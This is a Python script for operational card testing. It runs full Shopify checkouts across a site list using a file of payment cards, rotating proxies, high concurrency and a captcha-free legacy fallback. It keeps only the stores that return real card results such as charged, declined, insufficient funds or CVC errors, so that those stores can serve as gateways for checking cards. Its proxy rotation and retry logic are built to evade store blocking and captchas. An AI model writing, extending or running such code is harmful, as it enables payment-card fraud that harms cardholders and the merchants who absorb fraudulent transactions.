#!/usr/bin/env python3
"""Shopify site validator — full checkout per site; keep sites that give real card responses.

Real responses (KEEP): CHARGED / APPROVED / DECLINED (incl. card_declined, 3ds, insufficient_funds).
Everything else (REMOVE): dead site, login required, stable id not found, no products, challenges, etc.
"""
import asyncio, sys, os, json, time, argparse
from pathlib import Path

BASE = Path(__file__).resolve().parent
sys.path.insert(0, str(BASE))

from auto_async_v2 import run_checkout_for_card_async, normalize_proxy, CheckStatus, legacy_checkout_entry

_REAL_RESULTS = (
    "CARD_DECLINED", "ORDER_PAID", "INSUFFICIENT_FUNDS", "3DS_REQUIRED",
    "INVALID_PAYMENT_METHOD", "INVALID_CVC", "INCORRECT_CVC", "EXPIRED",
    "INVALID_PURCHASE_TYPE", "TEST_MODE_LIVE_CARD", "DECISION_RULE_BLOCK",
    "AMOUNT_TOO_SMALL", "TRANSACTION_NOT_ALLOWED", "RESTRICTED_CARD",
    "DO_NOT_HONOR", "GENERIC_DECLINE", "PROCESSING_ERROR", "PICK_UP_CARD",
    "GENERIC_ERROR", "ORDER_SUBMITTED", "EXPIRE_CARD", "CARD_NETWORK_NOT_ENABLED",
    "DELIVERY_UNAVAILABLE",
)


def load(path):
    p = Path(path)
    if not p.is_file():
        raise SystemExit(f"missing file: {p}")
    return [l.strip() for l in p.read_text(errors="ignore").splitlines()
            if l.strip() and not l.strip().startswith("#")]


async def run_one(i, site, cc, proxies, sem):
    """Run one checkout; retry a DIFFERENT proxy on transport errors, then legacy fallback."""
    async with sem:
        t0 = time.time()
        for attempt in range(2):
            proxy = normalize_proxy(proxies[(i + attempt) % len(proxies)])
            try:
                res = await run_checkout_for_card_async(site, cc, proxy)
            except Exception as e:
                emsg = str(e)[:120]
                if attempt < 2 and any(k in emsg.lower() for k in ("curl", "timeout", "connection", "resolve")):
                    continue
                return (site, "EXCEPTION", "", "0.00", emsg, False, round(time.time()-t0, 1))
            code = (res.status_code or "").strip().upper() or "UNKNOWN"
            err = str(res.error)[:140].replace("\n", " ") if res.error else ""
            real = res.status != CheckStatus.ERROR or code in _REAL_RESULTS
            # free-text real card/delivery responses Shopify reports as ERROR:
            # these mean the SITE works (card expired / brand unsupported / delivery-limited)
            if not real and any(k in (code + " | " + err).upper() for k in (
                    "BASE CREDIT CARD IS EXPIRED", "CREDIT CARD BRAND IS NOT SUPPORTED",
                    "NO AVAILABLE DELIVERY STRATEGY", "DELIVERY HANDLE", "DELIVERY_NO_DELIVERY")):
                real = True
            # proxy-level failures look like site errors; retry a fresh proxy
            if (not real and attempt < 2
                    and any(k in err.lower() for k in ("catalog blocked", "connection", "timed out", "timeout", "curl:", "resolve"))):
                continue
            # legacy REST fallback (captcha-free) on hard errors — skip dead catalogs
            if (not real and "no available products" not in err.lower()
                    and "catalog blocked" not in err.lower()):
                try:
                    leg = await legacy_checkout_entry(site, cc, proxy)
                except Exception:
                    leg = None
                if leg and leg.get("status") in ("charged", "approved", "declined"):
                    _lcode = (leg.get("code") or "CARD_DECLINED").upper()
                    _lstatus = {"charged": "CHARGED", "approved": "APPROVED", "declined": "DECLINED"}[leg["status"]]
                    return (site, _lstatus, _lcode, "0.00", "", True, round(time.time()-t0, 1))
            status_name = res.status.name if res.status is not None else "ERROR"
            return (site, status_name, code, res.amount or "0.00", err, real, round(time.time()-t0, 1))
        return (site, "EXCEPTION", "", "0.00", "proxy retries exhausted", False, round(time.time()-t0, 1))


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--sites", default=str(BASE / "site.txt"))
    ap.add_argument("--proxies", required=True)
    ap.add_argument("--cc-file", default=str(BASE.parent / "archive" / "test" / "all_cards.txt"))
    ap.add_argument("--concurrency", type=int, default=150)
    ap.add_argument("--timeout", type=float, default=150.0)
    ap.add_argument("--out", default="/tmp/shopify_sitecheck")
    a = ap.parse_args()

    sites = load(a.sites)
    proxies = load(a.proxies)
    cards = load(a.cc_file)
    os.makedirs(a.out, exist_ok=True)

    sem = asyncio.Semaphore(max(1, a.concurrency))
    good_f = open(os.path.join(a.out, "good_sites.txt"), "w", buffering=1)
    removed_f = open(os.path.join(a.out, "removed_sites.txt"), "w", buffering=1)
    print(f"== Shopify site check: {len(sites)} sites, {len(proxies)} proxies, {len(cards)} cards, {a.concurrency} concurrent ==", flush=True)

    jobs = []
    for i, site in enumerate(sites):
        cc = cards[i % len(cards)]
        jobs.append(asyncio.wait_for(run_one(i, site, cc, proxies, sem), timeout=a.timeout))

    good = 0
    removed = 0
    done = 0
    for coro in asyncio.as_completed(jobs):
        try:
            site, status, code, amount, err, real, dur = await coro
        except (asyncio.TimeoutError, Exception):
            done += 1
            continue
        done += 1
        line = f"{status:<10} {code:<28} {amount:>8} {dur:>6}s  {site}"
        if real:
            good += 1
            good_f.write(site + "\n")
            print(f"KEEP  {line}", flush=True)
        else:
            removed += 1
            removed_f.write(f"{site}  [{status}] {code} {err}\n")
            print(f"DROP  {line}  [{err[:60]}]", flush=True)

    good_f.close()
    removed_f.close()
    with open(os.path.join(a.out, "summary.json"), "w") as f:
        json.dump({"total": len(sites), "good": good, "removed": removed}, f, indent=2)
    print(f"== DONE == good={good} removed={removed} -> {a.out}", flush=True)


if __name__ == "__main__":
    asyncio.run(main())
